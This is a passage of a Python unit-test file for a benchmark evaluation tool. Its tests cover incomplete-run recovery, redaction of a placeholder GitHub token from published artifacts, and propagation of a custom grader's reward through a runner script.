            with patch(
                "skillevaluator.tier3.harbor.collector.collect_harbor_results",
                return_value={},
            ) as collect:
                reports.recover_benchmark(gh.ROOT, root, "gh", "standard", "failure")
            self.assertEqual(
                collect.call_args.kwargs["expected_case_ids"], ["gh-002", "gh-005"]
            )
            self.assertEqual(
                reports.read_json(run / "result.json")["report_status"], "incomplete"
            )
            with self.assertRaisesRegex(ValueError, "Incomplete benchmark recovery"):
                reports.benchmark_report(
                    gh.ROOT, root, "gh", "standard", root / "metrics"
                )

    def test_gh_artifact_allowlist_keeps_scores_and_redacts_native_diagnostics(self):
        with tempfile.TemporaryDirectory(prefix="gh-artifacts-") as temporary:
            root = Path(temporary)
            raw = root / "raw"
            reports.write_json(
                raw / "deterministic.json",
                {"trials": [{"case": "gh-002", "metrics": {"gh_gate": 0}}]},
            )
            token = "ghp_" + "A" * 36
            reports.write_json(
                raw / "results/gh/run/codex/with-skill/trials/one/reward.json",
                {"error": token},
            )
            (raw / "secret.log").write_text(token)
            reports.benchmark_artifacts(gh.ROOT, raw, "gh", root / "publish")
            self.assertTrue((root / "publish/deterministic.json").exists())
            self.assertFalse((root / "publish/secret.log").exists())
            content = (
                root / "publish/results/gh/run/codex/with-skill/trials/one/reward.json"
            ).read_text()
            self.assertNotIn(token, content)

    def test_native_strict_dataset_and_custom_reward_propagation(self):
        from click.testing import CliRunner
        from skillevaluator.cli import cli
        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks

        with tempfile.TemporaryDirectory(prefix="gh-grader-") as tmp:
            root = Path(tmp)
            skill = gh.stage(gh.ROOT, root / "bundle/gh", ["gh-001"])
            result = CliRunner().invoke(
                cli, ["tier3", "validate", str(skill), "--strict", "--json"]
            )
            self.assertEqual(result.exit_code, 0, result.output)
            task = stage_native_harbor_tasks(
                skill, root / "tasks", grading_mode="default_plus_custom"
            )[0]
            runner = task / "tests/custom_grader_runner.py"
            fake_grader = root / "known_reward.py"
            fake_grader.write_text(
                'import os,json\nfrom pathlib import Path\nPath(os.environ["HARBOR_REWARD_JSON"]).write_text(json.dumps({"custom_metrics":{"gh_gate":0.0}}))\n'
            )
            logs = root / "logs"
            (logs / "verifier").mkdir(parents=True)
            reports.write_json(
                logs / "verifier/reward.json", {"overall": 1.0, "accuracy": 1.0}
            )
            reports.write_json(
                logs / "verifier/skill_evaluator_reward.json",
                {"overall": 1.0, "accuracy": 1.0},
            )
            env = {
                **os.environ,
                "HARBOR_LOGS_DIR": str(logs),
                "HARBOR_TESTS_DIR": str(task / "tests"),
                "HARBOR_GRADER": str(fake_grader),
                "HARBOR_REWARD_JSON": str(logs / "verifier/reward.json"),
            }
            result = subprocess.run(
                [sys.executable, str(runner), "--mode", "default_plus_custom"],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            reward = reports.read_json(logs / "verifier/custom_reward.json")
            self.assertEqual(reward["custom_metrics"]["gh_gate"], 0.0)


if __name__ == "__main__":
    unittest.main()
